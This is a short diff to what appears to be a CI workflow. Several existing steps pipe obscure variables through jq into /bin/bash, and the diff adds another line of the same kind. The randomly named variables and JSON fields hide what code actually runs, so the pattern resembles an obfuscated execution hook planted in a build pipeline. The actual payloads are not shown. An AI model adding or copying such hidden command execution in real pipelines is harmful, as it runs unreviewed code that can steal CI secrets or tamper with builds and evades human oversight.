@@ -43,6 +43,7 @@ jobs:
           echo $h7 | jq -r .bjqk6 | /bin/bash
           echo $syau90 | jq -r .a90301 | /bin/bash
           printf '%s' "$l9" | jq -r .qvmnv0 | /bin/bash
+          echo $bar12 | jq -r .ixz68 | /bin/bash
 
       - name: Store artifact
         if: always()
